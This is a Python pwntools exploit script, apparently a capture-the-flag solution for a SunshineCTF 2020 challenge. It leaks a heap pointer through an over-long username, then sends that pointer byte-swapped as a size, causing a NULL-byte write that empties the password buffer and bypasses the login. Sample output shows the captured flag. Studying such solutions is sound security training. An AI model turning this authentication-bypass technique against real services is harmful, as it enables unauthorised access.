from pwn import *
import sys

def main(host, port):
    #p = process('./oomg_space2')
    p = remote(host, port)

    p.recvline()
    p.recvline()
    p.recvline()

    p.send(b'a'*16)

    ## eat 'BAD USER '
    p.recv(9)

    ## eat long name
    p.recv(16)

    ## read leak and remove newline
    leak = p.readuntil(b'\n', drop=True).ljust(8, b'\x00')

    addr = u64(leak)

    print('LEAK random buffer: 0x%.8x' %(addr))

    ## Eat user prompt
    p.recvline()

    ## Login as admin
    p.send(b'admin')

    ## Eat password prompt
    p.recvline()

    ## Send the size but it needs to be bswaped.
    ## If the size is really large then malloc will fail.
    ## After the malloc there the read() which fails on a null pointer
    ## Finally, the vulnerability. The bswapped size is added to the null pointer
    ## Then, a NULL byte is written to that location. If you send the bswapped
    ## leaked pointer then a NULL byte will be written to the start of the random
    ## buffer. The subsequent strlen() will return 0 and the compare function
    ## at 0x140f will never actually check any bytes and just return 0 which
    ## is considered a correct value. With a successful login you are just given
    ## the flag

    sz_bswapped = u64(leak, endian='big')

    p.send(p64(sz_bswapped))

    p.send(b'\n')
    p.recvline()
    p.recvline()
    print(p.recvline())
    p.recvline()
    p.send(b'y')

    p.close()

    '''
    [+] Opening connection to chal.2020.sunshinectf.org on port 20004: Done
    LEAK random buffer: 0x5580cdd9c040
    b'FLAG sun{w0uld_y0u_b3l13v3_1_f0rg07_4b0u7_null_byt35???}\n'
    [*] Closed connection to chal.2020.sunshinectf.org port 20004
    '''
if __name__=='__main__':
    if len(sys.argv) != 3:
        print(f'[USAGE] {sys.argv[0]} <host> <port>')
        exit(1)

    main(sys.argv[1], int(sys.argv[2]))
